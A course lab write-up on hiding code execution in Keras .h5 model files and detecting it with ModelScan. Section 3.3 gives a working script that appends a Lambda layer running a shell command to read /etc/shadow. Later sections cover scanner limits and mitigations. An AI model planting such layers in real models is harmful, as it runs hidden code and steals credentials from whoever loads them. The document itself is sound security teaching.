# Exercise: Scanning Models with ModelScan and Injecting Code via HDF5 Lambda Layers

Course: CAISP (Practical DevSecOps), Chapter 6 (Supply Chain Attacks in AI)
Status: Complete (benign model scanned clean, Lambda layer payload injected, live execution proven, trojanised model scanned and flagged)

## Scope and safety note

This runs inside the single self contained lab machine. The injected payload reads a file on that same box as a proof of code execution. The Lambda injection mechanism is the lesson and is shown faithfully so you can replicate it, but the harvested file contents (the lab reads `/etc/shadow`) and any password hashes are not reproduced here, because the point is that code ran, not what it read. Keep the payload pointed at your own lab box.

This lab completes a thread from `06-trojanized-neural-network-lab.md`, which flagged that an `.h5` file can carry executable code through Keras Lambda layers and deferred the how to "another lab". This is that lab, and it also pairs the attack with its detector, ModelScan.

## How to read this document

For the concept with no code, read **Part 1** and **Part 5**. To reproduce the lab, work through **Part 3**. **Part 4** covers what ModelScan catches, what it cannot, and why a Lambda layer is worse than a pickle payload.

---

# Part 1: Introduction (for everyone)

## What we are doing

We build an ordinary neural network and save it in the common `.h5` format. We scan it with a model scanner and confirm it is clean. Then we take that same clean model file and graft a small piece of malicious code into it, disguised as an extra layer, so that simply loading or using the model runs that code. We prove the code really runs (rather than just replaying something baked in), then scan the tampered file and watch the scanner flag it.

## The idea in plain terms

A neural network is a chain of layers. Keras has a special layer type, a "Lambda" layer, whose job is to run a little piece of Python you provide as part of the network's calculation. That is useful for legitimate custom math, and it is a gift to an attacker: you can put *any* Python in a Lambda layer, including a command to read secret files or open a connection. Because the Lambda layer is part of the model's computation, the code runs not just when the file is opened but every single time the model makes a prediction. The model still answers questions perfectly, so nothing looks wrong.

## Why it matters

1. **It kills the "just use `.h5` instead of pickle" myth.** People move off pickle thinking HDF5 is safe. It is not; a Lambda layer executes arbitrary code just like a pickle payload.
2. **The trigger is worse than pickle's.** A pickle payload fires once, on load. A Lambda layer is part of the forward pass, so it fires on load *and* on every inference.
3. **A scanner helps but does not decide.** ModelScan flags the Lambda layer, but only as a medium severity "unsafe operator", because a scanner cannot know whether a Lambda is doing legitimate math or stealing your secrets. The flag is a prompt to investigate, not a verdict.

## What to take away

Scan every model before you load it, with a tool that understands the format (ModelScan covers HDF5, pickle, and TensorFlow SavedModel). But understand the scanner's limits: it flags dangerous *capabilities*, not confirmed malice, so a flagged Lambda needs a human to judge. And the durable fix is the same as every supply chain lab: prefer a format that cannot carry code at all (safetensors), and verify where your models came from.

---

# Part 2: First Principles

**Principle 1: A Lambda layer stores runnable Python inside the model file.** When Keras saves a model with a Lambda layer, it serialises the Lambda's Python (its compiled bytecode) into the `.h5` file's layer config. When the model is loaded, that code is reconstructed; when the model runs, that code executes as part of the forward pass.

**Principle 2: The computation graph is an execution trigger.** Unlike pickle, where the payload fires only at `load`, a Lambda layer sits in the network's layer stack. So it runs at load time (and even at save time, as this lab shows) and again on every `predict`. More trigger points, more reliably fired.

**Principle 3: A good payload is transparent.** The lab's Lambda runs its command and then passes the input through unchanged (`os.system(...) or x` returns `x`, because `os.system` returns 0 on success and `0 or x` is `x`). The model's output is unaffected, so it still answers correctly and nothing looks amiss. The "malicious model still works perfectly" theme again.

**Principle 4: Detection is about capability, not intent.** A scanner sees "this model contains a Lambda layer", which is an unsafe operator because it *can* run arbitrary code. It cannot tell a legitimate custom layer from a credential stealer. Hence a medium severity flag that means "investigate this", not "this is malware".

**Principle 5: Format choice removes the capability.** Safetensors stores only numbers and has no mechanism to execute anything on load or inference. Choosing it is choosing whether the file *can* carry code, which is a stronger position than scanning for code after the fact.

---

# Part 3: Step by Step Replication

## 3.0 Environment

```bash
mkdir malicious-models && cd malicious-models

cat>requirements.txt<<EOF
tensorflow==2.18.0
scikit-learn==1.6.1
numpy==2.0.2
EOF

pip install -r requirements.txt
```

## 3.1 Build and save a benign model

The same tiny question and answer classifier from the trojanised neural network lab, saved as `keras_model.h5` with its vectoriser and responses saved separately:

```python
cat>train-benign-keras-model.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import numpy as np
import json
from sklearn.feature_extraction.text import TfidfVectorizer
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.utils import to_categorical
from tensorflow.keras.optimizers import Adam
import joblib

data = [
    ("What is AI?", 0), ("Define ML.", 1), ("Explain deep learning.", 2),
    ("What is Python?", 3), ("Define CPU.", 4), ("Define GPU.", 5),
    ("What is NLP?", 6), ("What is data science?", 7),
    ("What is optimizer?", 8), ("What is gradient descent?", 9)
]
responses = [
    "AI stands for Artificial Intelligence.", "Machine Learning is a branch of AI.",
    "Deep learning uses neural networks.", "Python is a popular programming language.",
    "CPU stands for Central Processing Unit.", "GPU is Graphics Processing Unit.",
    "Natural Language Processing is a part of AI.", "It is a field of analyzing data.",
    "Algorithm to minimize loss.", "Optimization method."
]

X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train).toarray()
y_vec = to_categorical(y_train, num_classes=10)

model = Sequential([
    Dense(64, activation='relu', input_shape=(X_vec.shape[1],)),
    Dense(10, activation='softmax')
])
model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy'])
model.fit(X_vec, y_vec, epochs=30, verbose=0)

model.save("keras_model.h5")
joblib.dump(vectorizer, "vectorizer.joblib")
with open("responses.json", "w") as f:
    json.dump(responses, f)

print("[ok] Keras model trained and saved as keras_model.h5")
EOF
```

The consumer loads the model and answers a question:

```python
cat>keras-model-consumer.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import numpy as np
import json
import joblib
from tensorflow.keras.models import load_model

model = load_model("keras_model.h5")
vectorizer = joblib.load("vectorizer.joblib")
with open("responses.json", "r") as f:
    responses = json.load(f)

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt]).toarray()
prediction = model.predict(X_input)
predicted_label = np.argmax(prediction)
print("Response:", responses[predicted_label])
EOF
```

Run both; "What is AI" returns "AI stands for Artificial Intelligence." A working, ordinary model.

## 3.2 Scan the clean model with ModelScan

ModelScan (Protect AI) scans HDF5, pickle, and TensorFlow SavedModel for unsafe constructs:

```bash
pip install modelscan==0.8.5
modelscan -p keras_model.h5
```

```
Scanning .../keras_model.h5 using modelscan.scanners.H5LambdaDetectScan model scan
--- Summary ---
 No issues found!
```

The benign model is clean. Note the scanner's name for the HDF5 check: `H5LambdaDetectScan`. It is specifically looking for Lambda layers, which is exactly what we are about to add.

## 3.3 Inject a Lambda layer payload

The attack takes the existing clean `keras_model.h5`, loads it, appends a Lambda layer carrying a command, and saves it under a new name. No retraining; just grafting code onto a finished model.

```python
cat>trojanizing-h5-model.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

from tensorflow.keras.models import load_model
from tensorflow.keras.layers import Lambda
from tensorflow.keras import Model

h5model = load_model("keras_model.h5")

malice = (
    lambda x: os.system(
        """cat /etc/shadow"""
    )
    or x
)

lambda_layer = Lambda(malice)(h5model.outputs[-1])
trojan_model = Model(inputs=h5model.inputs, outputs=lambda_layer)

trojan_model.save("keras_model_trojanized.h5")
print("[ok] Model saved as keras_model_trojanized.h5")
EOF
python3 trojanizing-h5-model.py
```

What each part does:

1. `load_model("keras_model.h5")` loads the clean model.
2. `malice` is the payload: a Lambda that runs a shell command and then returns its input `x` unchanged. The `or x` is the transparency trick (Principle 3): the command runs, but the layer still passes data through, so the model keeps working. The lab's command reads `/etc/shadow`; point it at your own box, and swap the path to anything to see the same effect.
3. `Lambda(malice)(h5model.outputs[-1])` adds the payload as a new final layer on top of the model's output.
4. `Model(...)` rebuilds the network with that layer included, and `save(...)` writes the tampered `.h5`.

Notice from the run that the command's output appears **during saving**. The Lambda already executed while building and serialising the trojanised model, the first of several trigger points. (The file read output itself is not reproduced here; what matters is that it ran.)

## 3.4 Consume the trojanised model: it fires on load and on inference

Point the consumer at the tampered file:

```bash
sed -i 's/keras_model\.h5/keras_model_trojanized.h5/g' keras-model-consumer.py
python3 keras-model-consumer.py
```

The command's output appears **when the model loads**, before you are even asked a question, and then again **when you ask a question** (inference runs the Lambda as part of the forward pass). And the model still answers "What is AI" correctly. Two trigger points, perfect normal behaviour, silent payload.

## 3.5 Prove it is live execution, not a replay

This is the lab's sharpest move, and it is good security thinking. A sceptic could argue the model merely memorised the file's contents at trojanising time and is replaying them, not executing live. To disprove that, change the file the payload reads *after* the model was built, then run the model again:

1. Add a new user on the box (so the credential file now contains a line that did not exist when the model was trojanised).
2. Run the consumer. The new user's line appears in the output.

Because the model was built *before* the user existed, the only way its contents can appear is if the Lambda is running the read command *live, right now*, each time. The lab repeats this to show it fires at inference too: start the consumer (payload runs on load), add a second user from another terminal while it waits at the prompt, then ask a question; the second new user appears, proving the Lambda executed again during inference. (The actual credential lines are not reproduced here; the proof is that fresh content appears, which only live execution explains.)

This verification method, change an external input and see whether the output changes, is the clean way to distinguish real code execution from memorisation, and worth keeping in your toolkit.

## 3.6 Scan the trojanised model

Now run the scanner on the tampered file:

```bash
modelscan -p keras_model_trojanized.h5
```

```
--- Summary ---
Total Issues: 1
Total Issues By Severity:
    - LOW: 0
    - MEDIUM: 1
    - HIGH: 0
    - CRITICAL: 0
--- MEDIUM ---
Unsafe operator found:
  - Severity: MEDIUM
  - Description: Use of unsafe operator 'Lambda' from module 'Keras'
  - Source: .../keras_model_trojanized.h5
```

ModelScan catches it: a medium severity "unsafe operator 'Lambda'". The clean model passed, the trojanised one is flagged. The scanner earned its place. The severity, and why it is only medium, is the subject of Part 4.

---

# Part 4: Security Analysis

## This completes the HDF5 code execution story

The trojanised neural network lab established that HDF5 models are not inherently safe and deferred the mechanism. Here it is: a Keras Lambda layer serialises arbitrary Python into the `.h5` file, and that Python runs on load and on inference. So the two part lesson from that lab holds fully: an attacker can wrap a pickle around an `.h5`, *and* the `.h5` itself can execute code. Neither pickle nor HDF5 is a safe container for a model you do not trust.

## Lambda layers are worse than pickle payloads

| Property | Pickle payload (`__reduce__`) | HDF5 Lambda layer |
| -------- | ----------------------------- | ----------------- |
| Fires at load | Yes | Yes |
| Fires at inference | No | Yes (it is in the forward pass) |
| Fires at save | No | Yes (building the model runs it) |
| Model still works | Yes | Yes (with the `or x` transparency trick) |
| Caught by a pickle only scanner | Yes | No |

The extra trigger points matter: a Lambda payload runs every time the model is used, not just once at load, so it keeps exfiltrating or beaconing for the whole life of the deployment, not just at startup.

## What ModelScan catches, and what it cannot

ModelScan is genuinely valuable here: it reads the HDF5 structure statically, without executing the model, and flags the Lambda layer that a pickle only scanner (Picklescan) would miss entirely. Scanning the inner model file, with a multi format scanner, is exactly the control the trojanised neural network lab recommended.

Its limits are the lesson, though:

1. **It flags capability, not intent.** A Lambda layer is an "unsafe operator" because it *can* run arbitrary code. ModelScan cannot tell a credential stealer from a legitimate custom math layer, so it reports the presence of the capability. That is why the severity is **medium**, not critical: "this file can execute code, investigate it", not "this file is malware".
2. **A flag needs a human.** A medium finding on a Lambda means someone has to open it up and decide. In a pipeline, the safe policy is to block any model with an unexpected Lambda layer unless a reviewer has cleared it.
3. **Scanners can be evaded.** As the earlier labs noted (the nullifAI technique against Picklescan), static scanners are necessary but not sufficient. Treat a clean scan as "no known bad pattern found", not "safe".

## Detection versus enforcement, again

ModelScan is detection. It tells you a model is dangerous; it does not stop you loading it. Enforcement is the pipeline refusing to load a flagged model, the runtime sandboxing it, and the format not permitting code in the first place. The same detection versus enforcement split from the LLM Guard lab applies to models: the scanner is the smoke alarm, not the sprinkler.

## Mitigations, in priority order

1. **Prefer safetensors.** No Lambda, no pickle, no code path on load or inference. This removes the capability rather than scanning for it, and it is why the field moved to safetensors.
2. **Scan with a multi format scanner before loading** (ModelScan for HDF5, pickle, SavedModel), and treat any unexpected Lambda or unsafe operator as a block pending review, not a warning to click past.
3. **Load untrusted models in isolation**, with no network, no mounted credentials, and least privilege, so even a fired payload reaches little. The lab's payload only read root only files because it ran as root.
4. **Verify provenance**: known publisher, pinned revision, verified hash, signed model (the Cosign and OpenSSF model signing labs). Know the exact file you loaded and prove it was not swapped or tampered.
5. **Record models in an ML BOM** with hashes, so "which model file is in production and is it the approved one?" is answerable.

## Where this sits in the course

This is the detection plus attack pair for the HDF5 case, and it ties the Chapter 6 supply chain thread together: the pickle trojan lab (pickle RCE), the neural network trojan lab (which teased this), this lab (HDF5 Lambda RCE plus ModelScan), the Picklescan and Grype labs (other scanners), and the Cosign and OpenSSF signing labs (provenance). The through line is one sentence: a model file is executable code, so scan it, prefer a format that cannot execute, and prove where it came from.

---

# Part 5: Conclusion (for everyone)

We built an honest little model, had a scanner confirm it was clean, and then slipped a single malicious instruction into it disguised as an extra layer. After that, every time the model was opened or asked a question, our instruction ran, quietly, while the model went on answering correctly as if nothing had changed. We even proved the instruction was running live, not replaying something old, by changing a file on the machine and watching the fresh change show up in the model's hidden output.

The headline is that `.h5` is not the safe harbour people think it is. Teams move off pickle believing HDF5 saves them, and it does not: a Keras Lambda layer runs arbitrary code just the same, and worse, it runs every time the model is used, not just once when it loads. The scanner we ran did catch it, which is the good news and the reason to scan every model before trusting it. But it caught it as a "medium, please investigate", because a scanner can see that a model *can* run code without knowing whether that code is a harmless calculation or a thief. The judgement is still yours.

So the real defence is the quiet one that appears in every supply chain lab: use a format that cannot carry code at all, scan the ones that can and actually act on the flags, run strangers' models in a locked room with nothing worth taking, and always know exactly whose model you are running and that no one changed it on the way. A model is a program. Scan it like one, and only run the ones you can vouch for.

---

## Ideas to take forward

1. Experiment: save the same model as `.safetensors` (weights only) and try to attach a Lambda payload to it. Show there is nowhere to put executable code, the positive proof behind mitigation 1.
2. Experiment: write the external input test from 3.5 up as a reusable method ("change an input the model should not know about, see if the output reflects it") for distinguishing live execution from memorisation in any suspected trojan.
3. Experiment: run the trojanised model inside a container with no network and no credential files mounted, and show the payload fires but reaches nothing useful. Isolation as a control.
4. Experiment: wire ModelScan into a pre load gate (block on any finding above low) and confirm the trojanised model is refused while the clean one passes, turning detection into enforcement.
5. Concept file: extend `concepts/pickle-vs-safetensors.md` with the HDF5 Lambda layer path and ModelScan, so the note covers every format and its scanner, with the capability versus intent point about why scanners flag rather than decide.

## Sources

1. ModelScan, Protect AI (scans H5, pickle, SavedModel; H5 Lambda detection): https://github.com/protectai/modelscan
2. Keras Lambda layer (serialises arbitrary Python; a known risk when loading untrusted models): https://keras.io/api/layers/core_layers/lambda/
3. Hugging Face, safetensors (no code execution on load): https://huggingface.co/docs/safetensors/index
4. OWASP Top 10 for LLM Applications, LLM03:2025 Supply Chain: https://genai.owasp.org/llm-top-10/
